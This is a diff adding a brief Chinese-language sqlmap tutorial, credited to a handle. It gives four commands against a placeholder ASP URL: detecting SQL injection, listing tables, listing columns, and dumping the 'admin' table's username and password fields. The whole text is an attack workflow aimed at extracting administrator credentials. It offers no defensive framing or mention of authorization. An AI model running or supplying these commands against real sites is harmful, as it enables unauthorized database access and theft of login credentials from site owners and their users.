@@ -1,0 +1,25 @@
+﻿
+
+                                           作者：拿破飞机
+
+---------------------------------------------------------------------------------------------
+1.判断注入的是否存在注入漏洞
+sqlmap -u "http://www.xxx.com/xx.asp?id=xxx"
+root@huc:~# sqlmap -u(-u：指定一个URL) "http://www.xxx.com/xx.asp?id=xxx"
+
+
+2.获取表名
+sqlmap -u “http：//www.xxx.com/xx.asp?id=xxx” --tables
+root@huc:~# sqlmap -u "http://www.xxx.com/xx.asp?id=xxx" --tables
+
+
+3.获取字段名
+sqlmap -u “http://www.xxx.com/xx.asp?id=xxx” --columns -T 表名
+root@huc:~# sqlmap -u "http://www.xxx.com/xx.asp?id=xxx" --columns -T admin
+
+
+4.获取字段中的内容
+sqlmap -u “http://www.xxx.com/xx.asp?id=xxx” --dump -T 表名 -C "字段名1,字段名2..."
+root@huc:~# sqlmap -u "http://www.xxx.com/xx.asp?id=xxx" --dump -T admin -C "username,password"
+
+
